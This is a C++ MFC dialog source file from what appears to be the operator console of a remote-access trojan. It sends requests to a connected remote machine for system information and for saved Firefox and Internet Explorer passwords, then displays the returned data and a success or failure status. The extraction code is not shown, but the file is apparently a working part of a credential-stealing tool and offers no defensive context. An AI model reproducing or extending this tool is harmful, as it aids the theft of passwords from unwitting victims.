// InfoDlg.cpp : implementation file
//

#include "stdafx.h"
#include "client.h"
#include "net.h"
#include "InfoDlg.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

typedef struct
{
	infotype_s	infotype;
	char		*title;
	MSGTYPE		msgtype;
} infodata_s;

infodata_s infodata[] =
{
	{SYSTEMINFO, "System Info", INFO},
	{FF, "Firefox Passwords", FIREFOX},
	{IE, "IE Passwords", PSTORE},
};

/////////////////////////////////////////////////////////////////////////////
// CInfoDlg dialog


CInfoDlg::CInfoDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CInfoDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CInfoDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CInfoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CInfoDlg)
	DDX_Control(pDX, IDC_STATUS2, m_Status);
	DDX_Control(pDX, IDC_OUTPUT, m_OutputScreen);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CInfoDlg, CDialog)
	//{{AFX_MSG_MAP(CInfoDlg)
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_NEW_INFO_MESSAGE, OnInfoMessage)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CInfoDlg message handlers

void CInfoDlg::OnExit() 
{
	cndata[CurrentSelection].hWnd = NULL;
	CDialog::OnOK();	
}

BOOL CInfoDlg::OnInitDialog() 
{
	int		i;
	CDialog::OnInitDialog();

	cndata[CurrentSelection].hWnd = GetSafeHwnd();


	for (i = 0; i < 3; i++)
	{
		if (infodata[i].infotype == infotype)
		{
			SetWindowText(infodata[i].title);
			NET_Send(CurrentSelection, infodata[i].msgtype, NULL);
		}
	}
	
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

LRESULT CInfoDlg::OnInfoMessage(UINT wParam, LONG lParam)
{
	if (NewText[wParam] == "success\r\n")
	{
		m_Status.SetWindowText("success");
	}
	else if (NewText[wParam] == "failed\r\n")
	{
		m_Status.SetWindowText("failed");
	}
	else
	{
		OutputText += NewText[wParam];
		m_OutputScreen.SetWindowText(OutputText);
	}

	UpdateData(TRUE);
	return 0;
}
